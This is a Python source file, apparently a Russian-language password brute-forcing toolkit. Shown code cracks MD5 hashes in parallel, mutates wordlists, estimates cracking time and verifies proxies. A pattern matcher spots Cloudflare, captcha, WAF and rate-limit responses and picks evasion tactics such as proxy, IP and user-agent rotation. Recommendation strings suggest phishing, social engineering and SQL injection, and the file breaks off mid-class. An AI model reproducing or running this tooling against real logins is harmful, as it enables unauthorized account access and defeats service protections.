import asyncio
import concurrent.futures
import hashlib
import time
import re
import json
from multiprocessing import Pool, cpu_count, Manager
from typing import List, Optional, Tuple, Dict, Any, Set
import aiohttp
from aiohttp_socks import ProxyConnector
import uvloop
import logging
from fake_useragent import UserAgent
import random
import numpy as np
from dataclasses import dataclass
from enum import Enum
from datetime import datetime
import pickle
from pathlib import Path
import multiprocessing as mp
from concurrent.futures import ProcessPoolExecutor, ThreadPoolExecutor
import itertools

# –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bruteforcer.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –±—ã—Å—Ç—Ä—ã–π event loop
asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())

class AttackType(Enum):
    HASH = "hash"
    WEB = "web"
    SSH = "ssh"
    API = "api"

@dataclass
class AttackResult:
    success: bool
    password: Optional[str] = None
    attempts: int = 0
    time_taken: float = 0.0
    strategy_used: str = "direct"

class ProtectionLevel(Enum):
    NONE = 0
    WEAK = 1
    MEDIUM = 2
    STRONG = 3
    VERY_STRONG = 4

# –ì–ª–æ–±–∞–ª—å–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ –¥–ª—è multiprocessing
def process_chunk_global(chunk, common_prefixes, common_suffixes):
    """–ì–ª–æ–±–∞–ª—å–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –¥–ª—è –æ–±—Ä–∞–±–æ—Ç–∫–∏ —á–∞–Ω–∫–∞ –ø–∞—Ä–æ–ª–µ–π"""
    local_enhanced = set()
    for word in chunk:
        # –û—Ä–∏–≥–∏–Ω–∞–ª—å–Ω–æ–µ —Å–ª–æ–≤–æ
        local_enhanced.add(word)
        
        # –î–æ–±–∞–≤–ª—è–µ–º —Å—É—Ñ—Ñ–∏–∫—Å—ã
        for suffix in common_suffixes:
            local_enhanced.add(word + suffix)
            local_enhanced.add(word + '_' + suffix)
        
        # –î–æ–±–∞–≤–ª—è–µ–º –ø—Ä–µ—Ñ–∏–∫—Å—ã
        for prefix in common_prefixes:
            local_enhanced.add(prefix + word)
            local_enhanced.add(prefix + '_' + word)
        
        # –ü—Ä–∏–º–µ–Ω—è–µ–º —Ç—Ä–∞–Ω—Å—Ñ–æ—Ä–º–∞—Ü–∏–∏
        transformations = [
            lambda x: x.upper(),
            lambda x: x.capitalize(),
            lambda x: x.lower(),
            lambda x: x + x,
            lambda x: x[::-1],
            lambda x: x.replace('a', '@').replace('e', '3').replace('i', '1'),
        ]
        
        for transform in transformations:
            try:
                transformed = transform(word)
                if transformed:
                    local_enhanced.add(transformed)
            except:
                continue
    
    return local_enhanced

def hash_chunk_global(chunk, target_hash):
    """–ì–ª–æ–±–∞–ª—å–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ —Ö–µ—à–µ–π –≤ —á–∞–Ω–∫–µ"""
    for password in chunk:
        if hashlib.md5(password.encode()).hexdigest() == target_hash:
            return password
    return None

class TimeEstimator:
    """–ò–Ω—Ç–µ–ª–ª–µ–∫—Ç—É–∞–ª—å–Ω–∞—è –æ—Ü–µ–Ω–∫–∞ –≤—Ä–µ–º–µ–Ω–∏ –≤–∑–ª–æ–º–∞ –∏ —Ä–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏"""
    
    def __init__(self):
        # –ë–µ–Ω—á–º–∞—Ä–∫–∏ –ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω–æ—Å—Ç–∏ (–æ–ø–µ—Ä–∞—Ü–∏–π/—Å–µ–∫—É–Ω–¥—É)
        self.benchmarks = {
            'hash_md5': {
                'cpu': 5_000_000,    # 5M —Ö–µ—à–µ–π/—Å–µ–∫ –Ω–∞ CPU
                'gpu': 10_000_000_000  # 10B —Ö–µ—à–µ–π/—Å–µ–∫ –Ω–∞ GPU
            },
            'web_request': {
                'direct': 10,        # 10 –∑–∞–ø—Ä–æ—Å–æ–≤/—Å–µ–∫ –Ω–∞–ø—Ä—è–º—É—é
                'proxy': 5,          # 5 –∑–∞–ø—Ä–æ—Å–æ–≤/—Å–µ–∫ —á–µ—Ä–µ–∑ –ø—Ä–æ–∫—Å–∏
                'stealth': 2         # 2 –∑–∞–ø—Ä–æ—Å–∞/—Å–µ–∫ –≤ stealth —Ä–µ–∂–∏–º–µ
            },
            'ssh_brute': {
                'default': 50        # 50 –ø–æ–ø—ã—Ç–æ–∫/—Å–µ–∫
            }
        }
        
        # –°–ª–æ–≤–∞—Ä–∏ –¥–ª—è –æ—Ü–µ–Ω–∫–∏ —Å–ª–æ–∂–Ω–æ—Å—Ç–∏
        self.password_complexity = {
            'very_weak': 10**4,      # 10^4 –∫–æ–º–±–∏–Ω–∞—Ü–∏–π
            'weak': 10**6,           # 10^6 –∫–æ–º–±–∏–Ω–∞—Ü–∏–π  
            'medium': 10**8,         # 10^8 –∫–æ–º–±–∏–Ω–∞—Ü–∏–π
            'strong': 10**10,        # 10^10 –∫–æ–º–±–∏–Ω–∞—Ü–∏–π
            'very_strong': 10**12    # 10^12 –∫–æ–º–±–∏–Ω–∞—Ü–∏–π
        }
    
    def estimate_hash_time(self, target_hash: str, wordlist_size: int, 
                          hardware: str = 'cpu') -> Dict[str, Any]:
        """–û—Ü–µ–Ω–∫–∞ –≤—Ä–µ–º–µ–Ω–∏ –¥–ª—è hash-–∞—Ç–∞–∫–∏"""
        speed = self.benchmarks['hash_md5'][hardware]
        total_operations = wordlist_size
        
        time_seconds = total_operations / speed
        time_human = self._format_time(time_seconds)
        
        return {
            'estimated_time': time_seconds,
            'formatted_time': time_human,
            'operations_per_sec': speed,
            'total_operations': total_operations,
            'hardware_used': hardware
        }
    
    def estimate_web_time(self, target_url: str, wordlist_size: int,
                         protection_level: ProtectionLevel) -> Dict[str, Any]:
        """–û—Ü–µ–Ω–∫–∞ –≤—Ä–µ–º–µ–Ω–∏ –¥–ª—è web-–∞—Ç–∞–∫–∏"""
        # –û–ø—Ä–µ–¥–µ–ª—è–µ–º —Å–∫–æ—Ä–æ—Å—Ç—å based on —É—Ä–æ–≤–Ω—è –∑–∞—â–∏—Ç—ã
        speed_map = {
            ProtectionLevel.NONE: self.benchmarks['web_request']['direct'],
            ProtectionLevel.WEAK: self.benchmarks['web_request']['direct'] * 0.5,
            ProtectionLevel.MEDIUM: self.benchmarks['web_request']['proxy'],
            ProtectionLevel.STRONG: self.benchmarks['web_request']['proxy'] * 0.3,
            ProtectionLevel.VERY_STRONG: self.benchmarks['web_request']['stealth']
        }
        
        speed = speed_map[protection_level]
        total_operations = wordlist_size
        time_seconds = total_operations / speed
        time_human = self._format_time(time_seconds)
        
        return {
            'estimated_time': time_seconds,
            'formatted_time': time_human,
            'requests_per_sec': speed,
            'total_requests': total_operations,
            'protection_level': protection_level.name
        }
    
    def estimate_brute_force_time(self, charset: str, max_length: int,
                                 hardware: str = 'cpu') -> Dict[str, Any]:
        """–û—Ü–µ–Ω–∫–∞ –≤—Ä–µ–º–µ–Ω–∏ –¥–ª—è brute force –∞—Ç–∞–∫–∏"""
        total_combinations = 0
        for length in range(1, max_length + 1):
            total_combinations += len(charset) ** length
        
        speed = self.benchmarks['hash_md5'][hardware]
        time_seconds = total_combinations / speed
        time_human = self._format_time(time_seconds)
        
        complexity = self._get_complexity_level(total_combinations)
        
        return {
            'estimated_time': time_seconds,
            'formatted_time': time_human,
            'total_combinations': total_combinations,
            'complexity_level': complexity,
            'feasible': time_seconds < 2592000  # 30 –¥–Ω–µ–π
        }
    
    def get_recommendations(self, attack_type: str, estimated_time: float,
                           wordlist_size: int, context: Dict) -> List[str]:
        """–ü–æ–ª—É—á–µ–Ω–∏–µ —Ä–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–π based on –æ—Ü–µ–Ω–∫–∏ –≤—Ä–µ–º–µ–Ω–∏"""
        recommendations = []
        
        if estimated_time > 2592000:  # > 30 –¥–Ω–µ–π
            recommendations.append("‚ùå –í–∑–ª–æ–º –ø—Ä–∞–∫—Ç–∏—á–µ—Å–∫–∏ –Ω–µ–≤–æ–∑–º–æ–∂–µ–Ω –∑–∞ —Ä–∞–∑—É–º–Ω–æ–µ –≤—Ä–µ–º—è")
            recommendations.extend(self._get_alternative_approaches(attack_type, context))
        
        elif estimated_time > 86400:  # > 1 –¥–µ–Ω—å
            recommendations.append("‚ö†Ô∏è –î–ª–∏—Ç–µ–ª—å–Ω—ã–π –ø—Ä–æ—Ü–µ—Å—Å - —Ä–∞—Å—Å–º–æ—Ç—Ä–∏—Ç–µ –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤—ã")
            recommendations.extend(self._get_optimization_tips(attack_type, context))
        
        elif estimated_time > 3600:  # > 1 —á–∞—Å
            recommendations.append("‚è≥ –ó–∞–π–º–µ—Ç –Ω–µ—Å–∫–æ–ª—å–∫–æ —á–∞—Å–æ–≤ - –º–æ–∂–Ω–æ –æ–ø—Ç–∏–º–∏–∑–∏—Ä–æ–≤–∞—Ç—å")
            recommendations.extend(self._get_optimization_tips(attack_type, context))
        
        else:
            recommendations.append("‚úÖ –í–∑–ª–æ–º feasible - –º–æ–∂–Ω–æ –Ω–∞—á–∏–Ω–∞—Ç—å")
        
        # –î–æ–±–∞–≤–ª—è–µ–º –∞–ø–ø–∞—Ä–∞—Ç–Ω—ã–µ —Ä–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏
        if attack_type == 'hash':
            recommendations.extend(self._get_hardware_recommendations(context))
        
        return recommendations
    
    def _get_alternative_approaches(self, attack_type: str, context: Dict) -> List[str]:
        """–†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏ –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã—Ö –ø–æ–¥—Ö–æ–¥–æ–≤"""
        alternatives = []
        
        if attack_type == 'hash':
            alternatives.extend([
                "üîß –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ Hashcat —Å GPU —É—Å–∫–æ—Ä–µ–Ω–∏–µ–º",
                "üîß –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Ä–∞–¥—É–∂–Ω—ã–µ —Ç–∞–±–ª–∏—Ü—ã",
                "üîß –ò—â–∏—Ç–µ —É—Ç–µ—á–∫–∏ –ø–∞—Ä–æ–ª–µ–π –≤ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–µ",
                "üîß –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–æ—Ü–∏–∞–ª—å–Ω—É—é –∏–Ω–∂–µ–Ω–µ—Ä–∏—é"
            ])
        
        elif attack_type == 'web':
            alternatives.extend([
                "üîß –ü–æ–ø—Ä–æ–±—É–π—Ç–µ SQL –∏–Ω—ä–µ–∫—Ü–∏–∏ –≤–º–µ—Å—Ç–æ –±—Ä—É—Ç—Ñ–æ—Ä—Å–∞",
                "üîß –ò—â–∏—Ç–µ —É—è–∑–≤–∏–º–æ—Å—Ç–∏ –≤ –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏",
                "üîß –ü—Ä–æ–≤–µ—Ä—å—Ç–µ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–µ –ø–∞—Ä–æ–ª–∏ –∞–¥–º–∏–Ω–∞",
                "üîß –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ñ–∏—à–∏–Ω–≥ –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –ø–∞—Ä–æ–ª—è"
            ])
        
        return alternatives
    
    def _get_optimization_tips(self, attack_type: str, context: Dict) -> List[str]:
        """–°–æ–≤–µ—Ç—ã –ø–æ –æ–ø—Ç–∏–º–∏–∑–∞—Ü–∏–∏"""
        tips = []
        
        if attack_type == 'hash':
            tips.extend([
                "‚ö° –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –ø—Ä–∞–≤–∏–ª–∞ Hashcat –¥–ª—è —É–ª—É—á—à–µ–Ω–∏—è —Å–ª–æ–≤–∞—Ä—è",
                "‚ö° –î–æ–±–∞–≤—å—Ç–µ –º–∞—Å–∫–∏ –∏ –ø–∞—Ç—Ç–µ—Ä–Ω—ã –ø–∞—Ä–æ–ª–µ–π",
                "‚ö° –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ä–∞—Å–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω—ã–µ –≤—ã—á–∏—Å–ª–µ–Ω–∏—è",
                "‚ö° –û–ø—Ç–∏–º–∏–∑–∏—Ä—É–π—Ç–µ —Å–ª–æ–≤–∞—Ä—å (—É–±–µ—Ä–∏—Ç–µ –¥—É–±–ª–∏–∫–∞—Ç—ã)"
            ])
        
        elif attack_type == 'web':
            tips.extend([
                "‚ö° –£–≤–µ–ª–∏—á—å—Ç–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ—Ç–æ–∫–æ–≤",
                "‚ö° –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –±–æ–ª—å—à–µ –ø—Ä–æ–∫—Å–∏ –¥–ª—è –æ–±—Ö–æ–¥–∞ –±–ª–æ–∫–∏—Ä–æ–≤–æ–∫",
                "‚ö° –ù–∞—Å—Ç—Ä–æ–π—Ç–µ —É–º–Ω—ã–µ –∑–∞–¥–µ—Ä–∂–∫–∏ –º–µ–∂–¥—É –∑–∞–ø—Ä–æ—Å–∞–º–∏",
                "‚ö° –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ä–æ—Ç–∞—Ü–∏—é User-Agent"
            ])
        
        return tips
    
    def _get_hardware_recommendations(self, context: Dict) -> List[str]:
        """–†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏ –ø–æ –∞–ø–ø–∞—Ä–∞—Ç–Ω–æ–º—É –æ–±–µ—Å–ø–µ—á–µ–Ω–∏—é"""
        recommendations = []
        
        if context.get('estimated_time_cpu', 0) > 3600:
            recommendations.extend([
                "üíª –î–ª—è —É—Å–∫–æ—Ä–µ–Ω–∏—è –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ GPU (NVIDIA RTX 4090)",
                "üíª –†–∞—Å—Å–º–æ—Ç—Ä–∏—Ç–µ –æ–±–ª–∞—á–Ω—ã–µ GPU —Å–µ—Ä–≤–∏—Å—ã (AWS, GCP)",
                "üíª –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ä–∞—Å–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω—ã–µ –≤—ã—á–∏—Å–ª–µ–Ω–∏—è"
            ])
        
        return recommendations
    
    def _format_time(self, seconds: float) -> str:
        """–§–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –≤—Ä–µ–º–µ–Ω–∏ –≤ —á–∏—Ç–∞–µ–º—ã–π –≤–∏–¥"""
        if seconds < 60:
            return f"{seconds:.1f} —Å–µ–∫—É–Ω–¥"
        elif seconds < 3600:
            return f"{seconds/60:.1f} –º–∏–Ω—É—Ç"
        elif seconds < 86400:
            return f"{seconds/3600:.1f} —á–∞—Å–æ–≤"
        elif seconds < 2592000:
            return f"{seconds/86400:.1f} –¥–Ω–µ–π"
        else:
            return f"{seconds/2592000:.1f} –º–µ—Å—è—Ü–µ–≤"
    
    def _get_complexity_level(self, combinations: int) -> str:
        """–û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ —É—Ä–æ–≤–Ω—è —Å–ª–æ–∂–Ω–æ—Å—Ç–∏ –ø–∞—Ä–æ–ª—è"""
        if combinations < self.password_complexity['very_weak']:
            return "very_weak"
        elif combinations < self.password_complexity['weak']:
            return "weak"
        elif combinations < self.password_complexity['medium']:
            return "medium"
        elif combinations < self.password_complexity['strong']:
            return "strong"
        else:
            return "very_strong"

class IntelligentAdvisor:
    """–ò–Ω—Ç–µ–ª–ª–µ–∫—Ç—É–∞–ª—å–Ω—ã–π —Å–æ–≤–µ—Ç–Ω–∏–∫ –ø–æ –≤—ã–±–æ—Ä—É –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–æ–≤"""
    
    def __init__(self):
        self.tools_db = {
            'hashcat': {
                'type': 'hash',
                'speed': 'very_high',
                'hardware': 'gpu',
                'best_for': ['md5', 'sha1', 'ntlm', 'wpa'],
                'complexity': ['medium', 'strong', 'very_strong']
            },
            'john': {
                'type': 'hash',
                'speed': 'high', 
                'hardware': 'cpu',
                'best_for': ['zip', 'pdf', 'ssh', 'rar'],
                'complexity': ['weak', 'medium']
            },
            'hydra': {
                'type': 'network',
                'speed': 'medium',
                'hardware': 'cpu',
                'best_for': ['http', 'ftp', 'ssh', 'smb'],
                'complexity': ['very_weak', 'weak']
            },
            'medusa': {
                'type': 'network', 
                'speed': 'medium',
                'hardware': 'cpu',
                'best_for': ['web', 'database', 'ssh'],
                'complexity': ['very_weak', 'weak']
            }
        }
    
    def recommend_tools(self, attack_type: str, complexity: str, 
                       estimated_time: float) -> List[Dict]:
        """–†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏—è –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–æ–≤ based on –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤"""
        recommended = []
        
        for tool_name, tool_info in self.tools_db.items():
            if (tool_info['type'] == attack_type and 
                complexity in tool_info['complexity']):
                
                # –î–æ–±–∞–≤–ª—è–µ–º —Ä–µ–π—Ç–∏–Ω–≥ —ç—Ñ—Ñ–µ–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏
                effectiveness = self._calculate_effectiveness(
                    tool_info, complexity, estimated_time
                )
                
                recommended.append({
                    'name': tool_name,
                    'effectiveness': effectiveness,
                    'reason': f"–û–ø—Ç–∏–º–∞–ª–µ–Ω –¥–ª—è {complexity} —Å–ª–æ–∂–Ω–æ—Å—Ç–∏",
                    'speed': tool_info['speed']
                })
        
        # –°–æ—Ä—Ç–∏—Ä—É–µ–º –ø–æ —ç—Ñ—Ñ–µ–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏
        recommended.sort(key=lambda x: x['effectiveness'], reverse=True)
        return recommended
    
    def _calculate_effectiveness(self, tool_info: Dict, complexity: str, 
                               estimated_time: float) -> float:
        """–†–∞—Å—á–µ—Ç —ç—Ñ—Ñ–µ–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞"""
        effectiveness = 0.0
        
        # –ë–∞–∑–æ–≤—ã–µ –≤–µ—Å–∞
        speed_weights = {'very_high': 1.0, 'high': 0.8, 'medium': 0.6, 'low': 0.4}
        complexity_weights = {'very_weak': 0.2, 'weak': 0.4, 'medium': 0.6, 'strong': 0.8, 'very_strong': 1.0}
        
        effectiveness += speed_weights.get(tool_info['speed'], 0.5)
        effectiveness += complexity_weights.get(complexity, 0.5)
        
        # –ö–æ—Ä—Ä–µ–∫—Ç–∏—Ä–æ–≤–∫–∞ based on –≤—Ä–µ–º–µ–Ω–∏
        if estimated_time > 86400:  # > 1 –¥–Ω—è
            effectiveness *= 1.5 if tool_info['speed'] == 'very_high' else 0.8
        
        return round(effectiveness, 2)

class CPUAccelerator:
    """–£—Å–∫–æ—Ä–∏—Ç–µ–ª—å –≤—ã—á–∏—Å–ª–µ–Ω–∏–π –Ω–∞ CPU —Å –º–Ω–æ–≥–æ–ø—Ä–æ—Ü–µ—Å—Å–æ—Ä–Ω–æ—Å—Ç—å—é"""
    
    def __init__(self, max_workers: int = None):
        self.max_workers = max_workers or (cpu_count() - 1 or 1)
        logger.info(f"CPU Accelerator initialized with {self.max_workers} workers")
    
    def parallel_hash_check(self, target_hash: str, password_chunks: List[List[str]]) -> Optional[str]:
        """–ü–∞—Ä–∞–ª–ª–µ–ª—å–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ —Ö–µ—à–µ–π —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –≥–ª–æ–±–∞–ª—å–Ω–æ–π —Ñ—É–Ω–∫—Ü–∏–∏"""
        with ProcessPoolExecutor(max_workers=self.max_workers) as executor:
            # –ò—Å–ø–æ–ª—å–∑—É–µ–º starmap –¥–ª—è –ø–µ—Ä–µ–¥–∞—á–∏ –Ω–µ—Å–∫–æ–ª—å–∫–∏—Ö –∞—Ä–≥—É–º–µ–Ω—Ç–æ–≤
            futures = [
                executor.submit(hash_chunk_global, chunk, target_hash)
                for chunk in password_chunks
            ]
            
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    # –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –¥—Ä—É–≥–∏–µ –ø—Ä–æ—Ü–µ—Å—Å—ã –µ—Å–ª–∏ –Ω–∞—à–ª–∏ –ø–∞—Ä–æ–ª—å
                    for f in futures:
                        f.cancel()
                    return result
        
        return None

class VectorizedHasher:
    """–í–µ–∫—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–Ω—ã–µ –≤—ã—á–∏—Å–ª–µ–Ω–∏—è —Ö–µ—à–µ–π —Å NumPy"""
    
    def __init__(self):
        self.hash_functions = {
            'md5': hashlib.md5,
            'sha1': hashlib.sha1,
            'sha256': hashlib.sha256
        }
    
    def vectorized_hash_batch(self, passwords: List[str], hash_type: str = "md5") -> np.ndarray:
        """–í–µ–∫—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–Ω–æ–µ –≤—ã—á–∏—Å–ª–µ–Ω–∏–µ —Ö–µ—à–µ–π –¥–ª—è –±–∞—Ç—á–∞"""
        hash_func = self.hash_functions.get(hash_type, hashlib.md5)
        results = []
        
        for password in passwords:
            results.append(hash_func(password.encode()).hexdigest())
        
        return np.array(results)
    
    def find_hash_match_vectorized(self, target_hash: str, hashes: np.ndarray, passwords: np.ndarray) -> Optional[str]:
        """–í–µ–∫—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–Ω—ã–π –ø–æ–∏—Å–∫ —Å–æ–≤–ø–∞–¥–µ–Ω–∏—è"""
        matches = np.where(hashes == target_hash)[0]
        if len(matches) > 0:
            return passwords[matches[0]]
        return None

class RateLimiter:
    """–û–≥—Ä–∞–Ω–∏—á–∏—Ç–µ–ª—å —Å–∫–æ—Ä–æ—Å—Ç–∏ –∑–∞–ø—Ä–æ—Å–æ–≤"""
    def __init__(self, max_requests_per_second: float = 50.0):
        self.max_requests = max_requests_per_second
        self.timestamps = []
        self.min_interval = 1.0 / max_requests_per_second
    
    async def acquire(self):
        now = time.time()
        self.timestamps = [ts for ts in self.timestamps if now - ts < 1.0]
        
        if len(self.timestamps) >= self.max_requests:
            sleep_time = 1.0 - (now - self.timestamps[0])
            if sleep_time > 0:
                await asyncio.sleep(sleep_time)
            now = time.time()
            self.timestamps = [ts for ts in self.timestamps if now - ts < 1.0]
        
        self.timestamps.append(now)

class FastPatternMatcher:
    """–ë—ã—Å—Ç—Ä—ã–π –∞–Ω–∞–ª–∏–∑–∞—Ç–æ—Ä –ø–∞—Ç—Ç–µ—Ä–Ω–æ–≤ –∑–∞—â–∏—Ç—ã"""
    
    def __init__(self):
        self.protection_patterns = {
            'cloudflare': [r'cloudflare', r'cf-ray', r'__cfduid'],
            'captcha': [r'captcha', r'recaptcha', r'hcaptcha'],
            'waf': [r'waf', r'security', r'firewall', r'forbidden'],
            'rate_limit': [r'rate.*limit', r'too.*many', r'429'],
            'block': [r'block', r'banned', r'ip.*block'],
        }
        
        self.evasion_strategies = {
            'cloudflare': {'delay': 2.0, 'proxy_rotate': True, 'user_agent_rotate': True},
            'captcha': {'delay': 5.0, 'proxy_rotate': True, 'change_strategy': True},
            'waf': {'delay': 3.0, 'proxy_rotate': True, 'headers_rotate': True},
            'rate_limit': {'delay': 10.0, 'proxy_rotate': True, 'reduce_concurrency': True},
            'block': {'delay': 15.0, 'proxy_rotate': True, 'change_ip': True},
        }
    
    def analyze_response(self, text: str, status_code: int) -> Optional[Dict]:
        """–ë—ã—Å—Ç—Ä—ã–π –∞–Ω–∞–ª–∏–∑ –æ—Ç–≤–µ—Ç–∞ –Ω–∞ –ø—Ä–∏–∑–Ω–∞–∫–∏ –∑–∞—â–∏—Ç—ã"""
        if status_code == 429:
            return self.evasion_strategies['rate_limit']
        
        if status_code >= 400:
            text_lower = text.lower()
            for pattern_name, patterns in self.protection_patterns.items():
                for pattern in patterns:
                    if re.search(pattern, text_lower, re.IGNORECASE):
                        return self.evasion_strategies[pattern_name]
        
        return None

class RuleEngine:
    """–ì–µ–Ω–µ—Ä–∞—Ç–æ—Ä —É–º–Ω—ã—Ö –ø—Ä–∞–≤–∏–ª –¥–ª—è –ø–∞—Ä–æ–ª–µ–π"""
    
    def __init__(self):
        self.common_suffixes = [
            '123', '!', '@', '#', '$', '%', '^', '&', '*', '()',
            '2023', '2024', '2025', '01', '02', '1', '2', '00'
        ]
        
        self.common_prefixes = [
            'admin', 'root', 'user', 'test', 'temp', 'super'
        ]
        
    def enhance_wordlist(self, base_words: List[str]) -> List[str]:
        """–£–ª—É—á—à–µ–Ω–∏–µ —Å–ª–æ–≤–∞—Ä—è —Å –ø–æ–º–æ—â—å—é –ø—Ä–∞–≤–∏–ª"""
        enhanced = set()
        
        for word in base_words:
            enhanced.add(word)
            
            for suffix in self.common_suffixes:
                enhanced.add(word + suffix)
                enhanced.add(word + '_' + suffix)
            
            for prefix in self.common_prefixes:
                enhanced.add(prefix + word)
                enhanced.add(prefix + '_' + word)
            
            # –ü—Ä–∏–º–µ–Ω—è–µ–º —Ç—Ä–∞–Ω—Å—Ñ–æ—Ä–º–∞—Ü–∏–∏
            transformations = [
                lambda x: x.upper(),
                lambda x: x.capitalize(),
                lambda x: x.lower(),
                lambda x: x + x,
                lambda x: x[::-1],
                lambda x: x.replace('a', '@').replace('e', '3').replace('i', '1'),
            ]
            
            for transform in transformations:
                try:
                    transformed = transform(word)
                    if transformed:
                        enhanced.add(transformed)
                except:
                    continue
        
        return list(enhanced)
    
    def parallel_enhance(self, base_words: List[str], chunk_size: int = 1000) -> List[str]:
        """–ü–∞—Ä–∞–ª–ª–µ–ª—å–Ω–æ–µ —É–ª—É—á—à–µ–Ω–∏–µ —Å–ª–æ–≤–∞—Ä—è —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –≥–ª–æ–±–∞–ª—å–Ω–æ–π —Ñ—É–Ω–∫—Ü–∏–∏"""
        enhanced = set(base_words)
        
        # –†–∞–∑–±–∏–≤–∞–µ–º –Ω–∞ —á–∞–Ω–∫–∏ –¥–ª—è –ø–∞—Ä–∞–ª–ª–µ–ª—å–Ω–æ–π –æ–±—Ä–∞–±–æ—Ç–∫–∏
        chunks = [base_words[i:i + chunk_size] for i in range(0, len(base_words), chunk_size)]
        
        with ProcessPoolExecutor() as executor:
            # –ò—Å–ø–æ–ª—å–∑—É–µ–º –≥–ª–æ–±–∞–ª—å–Ω—É—é —Ñ—É–Ω–∫—Ü–∏—é –≤–º–µ—Å—Ç–æ –º–µ—Ç–æ–¥–∞ –∫–ª–∞—Å—Å–∞
            futures = [
                executor.submit(
                    process_chunk_global, 
                    chunk, 
                    self.common_prefixes, 
                    self.common_suffixes
                )
                for chunk in chunks
            ]
            
            for future in concurrent.futures.as_completed(futures):
                try:
                    enhanced.update(future.result())
                except Exception as e:
                    logger.error(f"Error processing chunk: {e}")
        
        return list(enhanced)

class ProxyManager:
    """–£–º–Ω—ã–π –º–µ–Ω–µ–¥–∂–µ—Ä –ø—Ä–æ–∫—Å–∏ —Å –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–π –ø—Ä–æ–≤–µ—Ä–∫–æ–π"""
    
    def __init__(self):
        self.proxies = []
        self.good_proxies = []
        self.bad_proxies = set()
        self.proxy_stats = {}
        self.rotation_count = 0
    
    def load_proxies(self, proxy_file: str = None, proxy_list: List[str] = None):
        """–ó–∞–≥—Ä—É–∑–∫–∞ –ø—Ä–æ–∫—Å–∏ –∏–∑ —Ñ–∞–π–ª–∞ –∏–ª–∏ —Å–ø–∏—Å–∫–∞"""
        if proxy_file and Path(proxy_file).exists():
            with open(proxy_file, 'r') as f:
                self.proxies = [line.strip() for line in f if line.strip()]
        elif proxy_list:
            self.proxies = proxy_list
        
        self.good_proxies = self.proxies.copy()
        logger.info(f"Loaded {len(self.proxies)} proxies")
    
    async def verify_proxy(self, proxy: str) -> bool:
        """–ü—Ä–æ–≤–µ—Ä–∫–∞ —Ä–∞–±–æ—Ç–æ—Å–ø–æ—Å–æ–±–Ω–æ—Å—Ç–∏ –ø—Ä–æ–∫—Å–∏"""
        try:
            connector = ProxyConnector.from_url(proxy)
            timeout = aiohttp.ClientTimeout(total=15)
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                test_urls = [
                    'http://httpbin.org/ip',
                    'http://api.ipify.org',
                    'http://icanhazip.com'
                ]
                
                for url in test_urls:
                    try:
                        async with session.get(url, timeout=10) as response:
                            if response.status == 200:
                                return True
                    except:
                        continue
        except:
            pass
        return False
    
    async def verify_all_proxies(self):
        """–ü—Ä–æ–≤–µ—Ä–∫–∞ –≤—Å–µ—Ö –ø—Ä–æ–∫—Å–∏"""
        logger.info("Verifying proxies...")
        tasks = [self.verify_proxy(proxy) for proxy in self.proxies]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        self.good_proxies = [
            proxy for proxy, working in zip(self.proxies, results) 
            if working is True
        ]
        
